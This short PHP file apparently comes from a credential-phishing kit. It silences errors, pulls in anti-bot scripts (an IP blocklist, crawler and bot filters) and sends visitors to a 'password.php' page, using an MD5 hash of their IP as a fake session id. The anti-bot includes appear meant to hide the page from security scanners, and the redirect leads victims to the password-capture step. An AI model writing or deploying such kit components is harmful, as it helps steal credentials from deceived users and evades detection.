<?php
error_reporting(0);
include '../../blueprint/antbots/ip_blocklist.php';
include '../../blueprint/antbots/crawler.php';
include '../../blueprint/antbots/boting.php';
include '../../blueprint/antbots/myz.php';
include '../../huehuehue.php';
session_start();



$ip = $_SERVER['REMOTE_ADDR'];
$hash = md5($ip);

header("Location: password.php?&sessionid=$hash&ac=26");

?>